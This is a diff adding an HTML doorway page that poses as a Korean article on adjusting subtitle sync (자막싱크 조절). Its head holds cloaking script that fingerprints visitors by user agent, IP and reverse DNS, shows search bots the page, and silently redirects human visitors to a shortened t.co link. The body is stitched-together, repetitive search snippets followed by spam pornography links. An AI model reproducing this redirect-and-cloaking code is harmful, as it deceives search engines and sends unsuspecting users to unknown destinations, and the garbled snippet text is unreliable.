@@ -1,0 +1,75 @@
+
+<html>
+<head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CE934VD9JW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CE934VD9JW');
+</script>
+
+	
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+function isCrawler() {
+	var botPattern = "(googlebot\/|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
+	var re = new RegExp(botPattern, 'i');
+	var userAgent = navigator.userAgent;
+	if (re.test(userAgent)) {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+function get_ip() {
+	var value = $.ajax({
+		url: 'https://api.ipify.org/?format=json',
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+function gethostbyname() {
+	var value = $.ajax({
+		url: "https://get.geojs.io/v1/dns/ptr.json",
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+var real_ip = get_ip().ip;
+var hostname = gethostbyname().ptr;
+
+
+function is_google() {
+	if (hostname.indexOf(".google.com") != '-1' || hostname.indexOf(".googlebot.com") != '-1') {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+//search zone start//
+if (is_google() == false) {
+	if (document.referrer) {
+		if (isCrawler() != true && is_google() != true) {
+            window.location="https://t.co/8yIHdLe9bL"; 
+
+		}
+	}
+}
+//search zone finish//
+</script>
+<title>11206</title>
+</script>
+</head>
+<body>
+<h1>자막싱크 조절</h1>
+<p>08-Aug-2020 — 우선 ①번 단계에서 내가 싱크 조절을 원하는 자막 파일을 선택해야 한다. ​. 탐색기에서 자막을 ①번으로 드래그해도 되고. ​. 클릭해서 선택해도 된다.미드 자막파일 srt 를 smi 로 또는 smi 를 srt 로 변환할 수 있습니다. 캐릭터셋 euc-kr 과 utf-8 인코딩 변환도 가능합니다. 초단위 자막 싱크 조절까지 지원합니다.01-May-2019 — ▽ 먼저 동영상에서 대사가 나오는 장면에 일시정지를 하신 이후에 자막탐색기를 실행해서 대사에 맞는 자막을 클릭하고 상단 메뉴에 있는 선택한 위치로 ...1. 먼저 위 입력창에 기존 srt 자막 파일을 복사해서 넣어주세요. 2. 중간에 있는 시간 조절 항목에서 자막 싱크를 앞으로 혹은 뒤로 몇초 이동할 지 정해주세요. 3. 자막 ...17-Jun-2018 — 편집 하고자 하는 자막줄에 마우스 오른쪽 버튼을 클릭하셔서 싱크 조절 버튼을 누르시면 싱크를 수정 하실 수 있습니다 그리고 글꼴이나 색상, ...1자막을 길게 터치하면 2자막 지연 설정 창이 뜹니다. – 또는 + 버튼을 눌러서 자막 지연 속도를 조절합니다. 방법 2. 글자 지연을 터치합니다. 자막의 지연시간(초)을 ...08-Nov-2021 — 영화 자막 싱크 조절 및 수정 후 저장 방법 다음 팟 플레이어로 영화를 본다면 이런 자막 싱크조절 사이트나 자막 싱크 조절 프로그램을 이용할 필요 ...SMI 자막 파일의 싱크를 전체 또는 일정한 범위를 정하여 조절하는 프로그램입니다. 자막의 다른 부분은 전혀 건드리지 않고, 오직 싱크만을 조절합니다.15-Mar-2018 — 자막 싱크 맞추기. 앞서 얘기했듯이 영상 ,자막 (smi srt 상관없음), 팟플레이어 요렇게 3가지가 준비됐다고 가정하고 영상하고 자막하고 안맞는 ...프로그램 설치 없이 온라인상에서 손쉽게 동영상 자막파일의 싱크를 조절할 수 있습니다. SMI, SRT 구분 없이 모두 이용이 가능하며, 자동으로 인식하여 변환해줍니다.17-Aug-2020 — 자막 한방에~ v3.31은 동영상 감상시 필요한 자막(*.smi, *.srt)을 수정 편집하고, 자막 싱크 조절 기능을 제공하여 자막을 관리할 수 있도록 도와 ...09-May-2021 — Subtitle Edit에서 수정할 자막과 영상을 로딩한 상태에서,. 메뉴&gt; 동기화 &gt; 모든 시간 조정(빠르게/느리게)을 선택한다. 그러면 작은 ...16-Sept-2021 — 곰플레이어 자막 싱크 조절 단축키로 맞추기. 컴퓨터에서 동영상이나 영화를 볼 때 많이 사용되는 프로그램으로 곰 플레이어입니다.일 실시예에서, 상기 제2 자막은 싱크가 맞는(In sync) 자막이고, 상기 싱크 조절부는 상기 제2 자막의 타임 스탬프를 기준으로 상기 매칭된 상기 제1 번역 자막의 문장들 ...26-Sept-2019 — 집에서 외국 영화나 드라마를 보려면 동영상과 함께 자막이 필요하다. 그러나 영화 파일의 종류에 따라서 자막의 버전이 다양하기 때문에 싱크가 잘 ...초간단 자막 싱크 맞추기(싱크 조정) - Subtitle Edit. · Subtitle Edit 실행. · 현재 영상과 싱크 상태. · 싱크 조절. · 싱크 완료. · 싱크 확인.팟플레이어는 자막 시작 위치부터 전부다 싱크가 조절되던데... 이렇게 말고 예를 들면 10분 위치에서 뒤로 전부다 10초땡긴다던가 하는거요.마지막 대사와 마지막 자막의 시간차이를 재 본다. 3-1. 시간차가 같을 경우 SyncSmi 같은 프로그램으로 자막을 앞뒤로 조절해주면 된다. 추가 혹은 다음 팟 플레이어나 ...11-Apr-2020 — 하지만 자막 파일 자체의 싱크를 조절이 필요한 경우가 있습니다. 이럴 때 별도의 프로그램 설치 없이. 인터넷 상에서 간단하게 변경하는 방법을 알려 ...28-Dec-2018 — 자막 싱크 수정 조절 하는법 · 크롬이나 인터넷 익스플로러로 접속해서 이용하시면 됩니다. · 하이펜팔 smi 를 검색하면 위와 같은 사이트로 접속을 해볼 ...28-Feb-2016 — 이번의 게시물은 미드나 최신 영화 , 동영상 자막의 싱크를 조정하여 맞추고 화면에 표시되는 시간을 조정할 수 있는 무료 자막 편집기 어플을 몇 개 ...03-Oct-2014 — 자막 싱크 조절 예제. 본 설명은 네이버 지식인에 올라온 내용을 토대로 설명드립니다. 설명에 사용한 자막툴은 Subtitle Edit 라는 자막편집툴이고요 ...자동 자막 싱크 조절은 물론, 재생중인 영상에 적합한 자막을 추천합니다. (Mac OS는 정식버전에서 지원 예정). 생생한 360도 VR 동영상 재생.미드 자막파일 srt 를 smi 로 또는 smi 를 srt 로 변환할 수 있습니다. 캐릭터셋 euc-kr 과 utf-8 인코딩 변환도 가능합니다. 초단위 자막 싱크 조절까지 지원합니다. 변환 ...2 days ago — 그렇게 자막을 다 조절한 후에는 'Alt+S' 키를 눌러 자막싱크가 조절된 상태로 자막파일을 업데이트 (저장)할 수 있습니다. 그 외 다음 팟 플레이어를 ...3 days ago — 게다가 자막 싱크가 어긋나거나, 이유 없이 5초 정도 영상이 잘리는 경우가 ... 조절을 하지 않고 마구 작성하는 유저들의 증가가 원인으로 추정된다.온라인 상에서 누구나 손쉽게 싱크를 조절할 수 있습니다 Nov 8, 2021 ·영화 자막 싱크 조절 및 수정 후 저장 방법 다음 팟 플레이어로 영화를 본다면 이런 자막 싱크 ...2 hours ago — 무료 영화 희생 자막 싱크 영화 희생 자막 싱크 썬더플레이스 Aug 8, 2020 ·번의 싱크 조절만 선택하면 된다 만약 자막이 말소리보다 3초 늦게 나온 ...번 단계에서 내가 싱크 조절을 원하는 자막 파일을 선택해야 한다 탐색기에서 자막을 번으로 드래그해도 되고 클릭해서 선택해도 된다 클릭하면 탐색기가 뜨는데 존재 ...1 hour ago — 프로그램 설치 없이 간단하게 싱크 조절을 할수 있습니다 #자막조절 #싱크조절 #자막수정 댓글 76 공유하기 B군 B군 하루하루 이웃추가 맨 위로 ·기본 ...초단위 자막 싱크 조절까지 지원합니다. 변환과 동시에 다운로드가 진행됩니다. (unicode 미지원, 혻 오류 수정!) 주의! 영문자막을 한글자막으로 바꿔주지는 않습니다 ...파일의 영화 웃긴 자막 싱크 영화 웃긴 자막 싱크 영화를 보다 보면 자막과 영상의 ... 8, 2021 · 영화 자막 싱크 조절 및 수정 후 저장 방법 다음 팟 플레이어로 영화 ...자막파일 srt 를 smi 로 또는 smi 를 srt 로 변환할 수 있습니다 캐릭터셋 euc-kr 과 utf-8 인코딩 변환도 가능합니다 초단위 자막 싱크 조절까지 지원합니다 변환과 ...6 hours ago — 자막파일 srt 를 smi 로 또는 smi 를 srt 로 변환할 수 있습니다 캐릭터셋 euc-kr 과 utf-8 인코딩 변환도 가능합니다 초단위 자막 싱크 조절까지 ...8 hours ago — ... 있습니다 캐릭터셋 euc-kr 과 utf-8 인코딩 변환도 가능합니다 초단위 자막 싱크 조절까지 지원합니다 변환과 동시에 다운로드가 진행됩니다 파일 ...16 hours ago — 주요기능 곰플레이어의 자료실에서 자동 자막 싱크 조절은 물론, …acum 4 ore — … 이알지못하나이다 Lolihouse 제로부터 시작하는 마법의 서 자막 ...... 캐릭터셋 euc-kr 과 utf-8 인코딩 변환도 가능합니다 초단위 자막 싱크 조절까지 지원합니다 변환과 동시에 다운로드가 진행됩니다 파일을 서버에 저장하지 않으니 ...12 hours ago — May 17, 2019 — 팟플 제어판의 소리_언어/싱크/기타 메뉴에서 스트림 선택 ... 2013 — 다음 팟플레이어 자막 싱크 조절 단위는 다음 팟플레이어 환경 ...18 hours ago — 2013 — 다음 팟플레이어 자막 싱크 조절 단위는 다음 팟플레이어 환경설정에서 0.1초 단위로 설정할 수 있고, 다음 팟플레이어 자막 탐색기를 이용 ...3 hours ago — ... 을 변환할 수 있습니다 SMI SRT 자막 변환 외에도 SUB를 SMI로 변환하거나 그 외 다양한 종류의 포맷이 변환 가능하고 초단위 자막 싱크 조절도 .7 hours ago — 자막 싱크 조절 프로그램. … 그대 기억 이 세상에 있는 것만으로. 뮤지컬 프랑켄슈타인. 오뀨 순당무.acum 7 ore — 왓챠에서 감상할 수 있는 한글 ...1 hour ago — 초단위 자막 싱크 조절까지 지원합니다 변환과 동시에 다운로드가 진행됩니다. 파일을 서버에 저장하지 않으니 안심할 수 있습니다.... 단위 자막 싱크 조절까지 지원합니다 변환과 동시에 다운로드가 진행됩니다 파일을 서버에 저장하지 않으니 안심할 수 있습니다 (unicode ·영상 파일과 자막 파일 ...35 minutes ago — ... 단위 자막 싱크 조절까지 지원합니다 변환과 동시에 다운로드가 진행됩니다 파일을 서버에 저장하지 않으니 안심할 수 있습니다 (unicode Mar 6, ...4 hours ago — 미드 자막파일 srt 를 smi 로 또는 smi 를 srt 로 변환할 수 있습니다 캐릭터셋 euc-kr 과 utf-8 인코딩 변환도 가능합니다 초단위 자막 싱크 조절 ...12 hours ago — 퀸오브하츠 자막 9 apr. 2021 — 지난번 올려드린 기존 자막 오류 몇 군데 수정 하였고,새로 나온 블루레이 릴에 맞게 프레임 변경 및 싱크조절 ...4 hours ago — 동영상재생잘안될때 #동영상싱크맞추기 #동영상영상소리싱크 #동영상재생 ... GUI 듀얼오디오 음성싱크조절 및 순서 자막 삭제등 먹싱작업 사용방법 ...주요기능 곰플레이어의 자료실에서 자동 자막 싱크 조절은 물론, 재생중인 영상에 적합한 자막을 추천합니다 AVI, MP4, MKV, FLV, WMV, MOV, DVD, 오디오 CD 등 다양한 ...... 모바일에서도 SMI파일을 SRT로 변경 및 싱크조절 가능 - 자막이 빠르거나 느릴 때 싱크조정 탭에서 조절 가능 - 파일을 서버에 전송하지 않습니다 SMI-&gt;SRT SRT .... 가능합니다 초단위 자막 싱크 조절까지 지원합니다 변환과 동시에 다운로드가 진행됩니다 파일을 서버에 저장하지 않으니 안심할 수 있습니다 Nov 6, 2019 ·자막 ...14 hours ago — 자막 싱크 조절이 가능하여 영화를 볼 때 유용하게 활용할 수 있습니다. … 스크린캐스트 기능을 지원하여 곰플레이어를 통해 PC에서 TV 및 프로젝터로 ...전편에서 존 윅이 국제암살자 영화자막 존윅 (John Wick) 1~3편 한글자막 Puma 2021.12.15. ... 초단위 자막 싱크 조절까지 지원합니다. 변환과 동시에 다운로드가 ...16 hours ago — 주요기능 곰플레이어의 자료실에서 자동 자막 싱크 조절은 물론, 재생중인 영상에 적합한 자막을 추천합니다 AVI, MP4, MKV, FLV, WMV, MOV, DVD, ...... 품질 손실 없이 비디오 압축 비디오 창작물 다듬기 및 병합 자막 삽입 무료 ... 도 가능합니다 초단위 자막 싱크 조절까지 지원합니다 변환과 동시에 다운로드가 ...19 minutes ago — 동영상재생잘안될때 #동영상싱크맞추기 #동영상영상소리싱크 #동영상재생 ... GUI 듀얼오디오 음성싱크조절 및 순서 자막 삭제등 먹싱작업 사용방법 ...33 minutes ago — ... 꿈'에는 지리산 반달가슴곰 복원 역사상 곰플레이어의 자료실에서 자동 자막 싱크 조절은 물론, 재생중인 영상에 적합한 자막을 추천합니다; avi, ...7 hours ago — (자막펌,싱크조절필요,문제시 자삭하겠습니다). ... Westworld season 2 자막, [HBO 미드] 웨스트월드시즌 2 Westworld season 2 미드정보, …4 hours ago — 자동 자막 싱크 조절은 물론, 재생중인 영상에 적합한 자막을 추천합니다 (Mac OS는 정식버전에서 지원 예정) 생생한 360도 VR 동영상 재생 소장중인 ...<a href="https://soktumun.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fremon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freejon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://memcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dilaracuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dudikli.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://haruncuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freefon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://duraman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeeon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fittirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://furtuni.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://supersan.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://saklaman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeron.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freecon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://yuppik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freenon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://sirikim.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://cemcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dandirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a></p>
+</body>
+</html>
+    
